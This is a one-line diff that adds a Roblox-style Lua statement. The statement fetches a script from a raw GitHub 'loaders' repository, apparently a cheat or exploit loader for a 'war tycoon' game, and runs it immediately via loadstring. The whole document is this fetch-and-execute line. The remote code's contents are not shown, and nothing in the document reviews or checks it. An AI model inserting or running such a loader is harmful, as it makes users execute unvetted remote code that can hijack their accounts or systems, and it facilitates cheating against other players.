@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/rework-war-tycoon-spam6-grx4eov6obj009.lua"))()
